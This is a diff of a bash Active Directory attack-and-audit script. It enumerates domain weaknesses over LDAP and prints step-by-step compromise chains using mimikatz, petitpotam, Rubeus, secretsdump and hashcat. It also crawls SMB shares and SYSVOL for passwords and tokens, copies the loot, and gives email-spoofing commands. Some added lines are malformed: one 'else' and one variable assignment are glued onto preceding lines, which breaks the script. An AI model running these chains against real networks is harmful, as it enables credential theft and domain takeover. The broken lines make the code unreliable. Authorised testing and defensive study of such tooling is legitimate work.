@@ -245,7 +245,8 @@ else
   DC_COUNT=0
 fi
 
-RODC_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))" sAMAccountName dNSHostName 2>/dev/null)
+# RODC
+RODC_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))" sAMAccountName dNSHostName msDS-RevealOnDemandGroup msDS-NeverRevealGroup 2>/dev/null)
 RODC_COUNT=$(echo "$RODC_OUTPUT" | grep -c "^sAMAccountName:")
 if [ "$RODC_COUNT" -gt 0 ]; then
   > "$OUTPUT_DIR/all_rodcs.txt"
@@ -253,10 +254,13 @@ if [ "$RODC_COUNT" -gt 0 ]; then
     echo "${sam}:${dns}" >> "$OUTPUT_DIR/all_rodcs.txt"
   done
   echo -e "${GREEN}[OK] Found $RODC_COUNT RODC(s) → all_rodcs.txt${NC}"
-  RODC_CACHING=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))" sAMAccountName msDS-RevealOnDemandGroup msDS-NeverRevealGroup 2>/dev/null)
-  PRIVILEGED_CACHED=$(echo "$RODC_CACHING" | grep -i "msDS-RevealOnDemandGroup:" | grep -v "^$")
-  if [ ! -z "$PRIVILEGED_CACHED" ]; then
-    echo -e "${RED}       └─ RODC credential caching — privileged accounts may be cached on RODC${NC}"
+  PRIVILEGED_CACHED=$(echo "$RODC_OUTPUT" | grep -i "msDS-RevealOnDemandGroup:" | grep -iE "Domain Admins|Enterprise Admins|Administrator|krbtgt")
+  NEVER_REVEAL=$(echo "$RODC_OUTPUT" | grep -i "msDS-NeverRevealGroup:" | grep -iE "Domain Admins|Enterprise Admins|Administrator|krbtgt")
+  if [ ! -z "$PRIVILEGED_CACHED" ] && [ -z "$NEVER_REVEAL" ]; then
+    echo -e "${RED}       └─ RODC credential caching — privileged accounts in RevealOnDemandGroup${NC}"
+    echo "$PRIVILEGED_CACHED" | while read -r line; do
+      echo -e "${RED}          └─ $line${NC}"
+    done
   else
     echo -e "${GREEN}       └─ RODC credential caching policy appears restricted${NC}"
   fi
@@ -431,7 +435,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             /Trustee \(SID\)/ {
               trustee=$NF
               if (upn && mask ~ /0x20|WriteProperty/) {
-                if (trustee !~ /Domain Admins|Enterprise Admins|Administrators|SYSTEM|S-1-5-18/) {
+                if (trustee !~ /Domain Admins|Enterprise Admins|Administrators|SYSTEM|S-1-5-18|S-1-5-32-544|Group Policy Creator Owners|-519\b/) {
                   print trustee " → " target
                 }
               }
@@ -478,18 +482,22 @@ fi
 echo ""
 
 # Unconstrained Delegation - Computer
-UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
-  grep "^sAMAccountName:" | awk '{print $2}')
-
+UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
 NON_DC_UNCON=""
-dc_short=$(echo "$DC_FQDN" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
 while IFS= read -r system; do
   [ -z "$system" ] && continue
-  system_lower=$(echo "$system" | tr '[:upper:]' '[:lower:]')
-  system_clean="${system_lower%\$}"
-  if ! echo "$DC_SAMNAMES" | grep -qx "$system_lower" && [ "$system_clean" != "$dc_short" ]; then
+  system_lower=$(echo "$system" | tr '[:upper:]' '[:lower:]' | tr -d '$')
+  IS_DC=0
+  if [ -f "$OUTPUT_DIR/all_dcs.txt" ]; then
+    while IFS=: read -r dc_fqdn dc_ip_iter; do
+      dc_short=$(echo "$dc_fqdn" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
+      if [ "$system_lower" = "$dc_short" ]; then
+        IS_DC=1
+        break
+      fi
+    done < "$OUTPUT_DIR/all_dcs.txt"
+  fi
+  if [ "$IS_DC" -eq 0 ]; then
     NON_DC_UNCON="${NON_DC_UNCON}${system}\n"
   fi
 done <<< "$UNCON_SYSTEMS"
@@ -506,8 +514,7 @@ if [ "$NON_DC_COUNT" -gt 0 ]; then
   echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: mimikatz sekurlsa::tickets /export${NC}"
   echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <HOST_IP> $DC_IP${NC}"
   echo -e "${GREY}          3) mimikatz: kerberos::ptt <DC_TGT>.kirbi${NC}"
-  echo -e "${GREY}          4) secretsdump.py -k -no-pass '$DOMAIN/DC01\$@$DC_FQDN'${NC}"
-else
+  echo -e "${GREY}          4) secretsdump.py -k -no-pass '$DOMAIN/${DC_HOSTNAME}\$@$DC_FQDN'${NC}"else
   echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
 fi
 
@@ -606,12 +613,12 @@ if [ ! -z "$COERCE_METHODS" ]; then
   echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
   if [ ! -z "$NON_DC_UNCON" ]; then
     echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-    echo -e "${GREY}          1) $FIRST_UNCON_HOST: Rubeus.exe monitor /interval:1 /nowrap${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' $FIRST_UNCON_HOST $DC_IP${NC}"
+    echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: Rubeus.exe monitor /interval:1 /nowrap${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' $FIRST_NON_DC_UNCON $DC_IP${NC}"
     echo -e "${GREY}          3) Copy base64 ticket → echo '<base64>' | base64 -d > dc.kirbi${NC}"
     echo -e "${GREY}          4) ticketConverter.py dc.kirbi dc.ccache${NC}"
     echo -e "${GREY}          5) export KRB5CCNAME=dc.ccache${NC}"
-    echo -e "${GREY}          6) secretsdump.py -k -no-pass '$DOMAIN/DC01\$@$DC_FQDN'${NC}"
+    echo -e "${GREY}          6) secretsdump.py -k -no-pass '$DOMAIN/${DC_HOSTNAME}\$@$DC_FQDN'${NC}"
   fi
   PREFERRED_ORDER=("PetitPotam" "PrinterBug" "DFSCoerce" "ShadowCoerce" "MSEven")
     FIRST_COERCE=""
@@ -1208,24 +1215,6 @@ else
   echo -e "${GREEN}[OK] No computer accounts with Pre-Windows 2000 default password${NC}"
 fi
 
-# Pre-Windows 2000 Compatible Access Group
-PRE2K_GROUP_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(cn=Pre-Windows 2000 Compatible Access)" member 2>/dev/null)
-PRE2K_MEMBERS=$(echo "$PRE2K_GROUP_OUTPUT" | grep "^member:" | awk '{print $2}')
-PRE2K_EVERYONE=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-1-0")
-PRE2K_ANON=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-5-7")
-PRE2K_AUTHUSERS=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-5-11")
-if [ "$PRE2K_EVERYONE" -gt 0 ] || [ "$PRE2K_ANON" -gt 0 ]; then
-  echo -e "${RED}[KO] Pre-Windows 2000 compatible access contains Everyone/Anonymous → unauthenticated SAMR enumeration possible → pre2k_group.txt${NC}"
-  [ "$PRE2K_EVERYONE" -gt 0 ] && echo -e "${RED}       └─ Everyone (S-1-1-0)${NC}"
-  [ "$PRE2K_ANON" -gt 0 ] && echo -e "${RED}       └─ Anonymous Logon (S-1-5-7)${NC}"
-  echo "$PRE2K_MEMBERS" > "$OUTPUT_DIR/pre2k_group.txt"
-elif [ "$PRE2K_AUTHUSERS" -gt 0 ]; then
-  echo -e "${RED}[KO] Pre-Windows 2000 compatible access contains Authenticated Users → pre2k_group.txt${NC}"
-  echo "$PRE2K_MEMBERS" > "$OUTPUT_DIR/pre2k_group.txt"
-else
-  echo -e "${GREEN}[OK] Pre-Windows 2000 compatible access group is clean${NC}"
-fi
-
 echo ""
 
 # LAPS Check
@@ -1387,8 +1376,7 @@ if [ "$KERBEROAST_COUNT" -gt 0 ]; then
     echo -e "${RED}       └─ $account${NC}"
   done
   echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
-  RC4_ONLY=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=user)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=4)(servicePrincipalName=*))" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
-  RC4_COUNT=$(echo "$RC4_ONLY" | grep -v "^$" | wc -l)
+  RC4_ONLY=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=user)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=4)(servicePrincipalName=*)(!(objectClass=computer)))" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')  RC4_COUNT=$(echo "$RC4_ONLY" | grep -v "^$" | wc -l)
   if [ "$RC4_COUNT" -gt 0 ]; then
     echo -e "${GREY}       └─ $RC4_COUNT Kerberoastable account(s) restricted to RC4 (faster to crack)${NC}"
     echo "$RC4_ONLY" | while read -r account; do
@@ -1423,7 +1411,6 @@ TIMEROAST_HASHES=$(echo "$TIMEROAST_OUTPUT" | grep -c '\$sntp-ms\$')
 if [ "$TIMEROAST_HASHES" -gt 0 ]; then
   echo -e "${RED}[KO] $TIMEROAST_HASHES Timeroastable account(s) found → timeroast.txt${NC}"
   echo "$TIMEROAST_OUTPUT" | grep '\$sntp-ms\$' > "$OUTPUT_DIR/timeroast.txt"
-  echo -e "${GREY}       └─ hashcat -m 31300 '$OUTPUT_DIR/timeroast.txt' /usr/share/wordlists/rockyou.txt${NC}"
 elif echo "$TIMEROAST_OUTPUT" | grep -qE "STATUS_NOT_SUPPORTED|NTLM.*disabled|Kerberos"; then
   echo -e "${GREY}[--] Timeroasting skipped: NTLM disabled${NC}"
   echo -e "${GREY}       └─ Use Kerberos auth: nxc smb $DC_FQDN -u '$AD_USER' -p '$PASSWORD' -k -M timeroast${NC}"
@@ -1497,20 +1484,8 @@ else
 fi
 
 # GPO creation rights (CreateChild on CN=Policies,CN=System)
-GPO_CREATE_RAW=$(dacledit.py -action read \
-  -target-dn "CN=Policies,CN=System,$DOMAIN_DN" \
-  -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
-GPO_CREATE=$(echo "$GPO_CREATE_RAW" | awk '
-  /Access mask/ { mask=$NF }
-  /Trustee \(SID\)/ {
-    trustee=$NF
-    if (trustee !~ /Domain Admins|Enterprise Admins|Administrators|SYSTEM|S-1-5-18|S-1-5-32-544|Group Policy Creator Owners/) {
-      if (mask ~ /CreateChild|0x1\b|0xf01ff/) {
-        print trustee
-      }
-    }
-  }
-' | sort -u)
+GPO_CREATE_RAW=$(dacledit.py -action read -target-dn "CN=Policies,CN=System,$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
+GPO_CREATE=$(echo "$GPO_CREATE_RAW" | awk '/Access mask/{mask=$NF} /Trustee \(SID\)/{trustee=$NF; gsub(/[()]/,"",trustee); if(trustee !~ /Domain Admins|Enterprise Admins|Administrators|SYSTEM|S-1-5-18|S-1-5-32-544|Group Policy Creator Owners|-519$/ && mask ~ /CreateChild|0x1\b|0xf01ff/) print trustee}' | sort -u)
 if [ ! -z "$GPO_CREATE" ]; then
   GPO_CREATE_COUNT=$(echo "$GPO_CREATE" | grep -v "^$" | wc -l)
   echo -e "${RED}[KO] $GPO_CREATE_COUNT principal(s) with GPO creation rights (CreateChild on CN=Policies)${NC}"
@@ -1694,33 +1669,32 @@ fi
 if [[ "$DOMAIN" == *.local || "$DOMAIN" == *.htb ]]; then
   echo -e "${GREY}[--] SPF, DMARC and open relay skipped (.local domain is internal only)${NC}"
 else
-  SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
-  DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
-  MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
-  
+  APEX_DOMAIN=$(echo "$DOMAIN" | awk -F'.' '{print $(NF-1)"."$NF}')
+  SPF_CHECK=$(dig txt $APEX_DOMAIN +short 2>/dev/null | grep "v=spf1")
+  DMARC_CHECK=$(dig txt _dmarc.$APEX_DOMAIN +short 2>/dev/null | grep "v=DMARC1")
+  MX_SERVER=$(dig mx $APEX_DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
   if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
     echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
-    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+    echo -e "${GREY}       └─ swaks --to target@$APEX_DOMAIN --from ceo@$APEX_DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
   elif [ -z "$SPF_CHECK" ]; then
     echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
-    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+    echo -e "${GREY}       └─ swaks --to target@$APEX_DOMAIN --from ceo@$APEX_DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
   elif [ -z "$DMARC_CHECK" ]; then
     echo -e "${RED}[KO] No DMARC record (SPF present but unenforced — header-from spoofing possible)${NC}"
-    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+    echo -e "${GREY}       └─ swaks --to target@$APEX_DOMAIN --from ceo@$APEX_DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
   else
     echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
   fi
   if command -v swaks &>/dev/null && [ ! -z "$MX_SERVER" ]; then
-    OPEN_RELAY=$(swaks --to test@gmail.com --from ceo@$DOMAIN --server $MX_SERVER --timeout 10 --quit-after RCPT 2>&1)
+    OPEN_RELAY=$(swaks --to test@gmail.com --from ceo@$APEX_DOMAIN --server $MX_SERVER --timeout 10 --quit-after RCPT 2>&1)
     if echo "$OPEN_RELAY" | grep -q "^-> RCPT" && echo "$OPEN_RELAY" | grep -q "^<-  250"; then
       echo -e "${RED}[KO] Open Relay detected on $MX_SERVER${NC}"
-      echo -e "${GREY}       └─ swaks --to target@victim.com --from ceo@$DOMAIN --server $MX_SERVER${NC}"
+      echo -e "${GREY}       └─ swaks --to target@victim.com --from ceo@$APEX_DOMAIN --server $MX_SERVER${NC}"
     else
       echo -e "${GREEN}[OK] No Open Relay on $MX_SERVER${NC}"
     fi
   fi
 fi
-
 # Exchange DACL Check
 EXCHANGE_GROUPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(|(cn=Organization Management)(cn=Exchange Trusted Subsystem))" cn member 2>/dev/null)
 EXCHANGE_DETECTED=$(echo "$EXCHANGE_GROUPS" | grep -c "^cn:")
@@ -1832,6 +1806,14 @@ if [ "$BH_MODE" != "DCOnly" ]; then
     fi
     if [ ! -z "$MANSPIDER_CMD" ]; then
       SHARE_HOSTS=$(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$OUTPUT_DIR/smb_shares.txt" | sort -u)
+      DC_IP_LIST=$(awk -F: '{print $2}' "$OUTPUT_DIR/all_dcs.txt" 2>/dev/null)
+      SHARE_HOSTS_FILTERED=""
+      while IFS= read -r host; do
+        if ! echo "$DC_IP_LIST" | grep -q "^${host}$"; then
+          SHARE_HOSTS_FILTERED="${SHARE_HOSTS_FILTERED}${host}"$'\n'
+        fi
+      done <<< "$SHARE_HOSTS"
+      SHARE_HOSTS=$(echo "$SHARE_HOSTS_FILTERED" | grep -v "^$")
       mkdir -p "$OUTPUT_DIR/manspider"
       mkdir -p "$OUTPUT_DIR/manspider/loot"
       > "$OUTPUT_DIR/manspider/manspider.txt"
@@ -1839,7 +1821,7 @@ if [ "$BH_MODE" != "DCOnly" ]; then
         timeout 60 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c passw passw secret credential token apikey username connectionstring bios pwd passw admin account login logon cred bank ELBA -e txt xml ini config conf csv bat ps1 -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
         cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
       done
-      
+
       # Manspider SYSVOL
       timeout 60 $MANSPIDER_CMD $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" --share SYSVOL -c passw secret credential token apikey username connectionstring pwd admin login logon cred -e txt xml ini config conf csv bat ps1 vbs -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
       cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
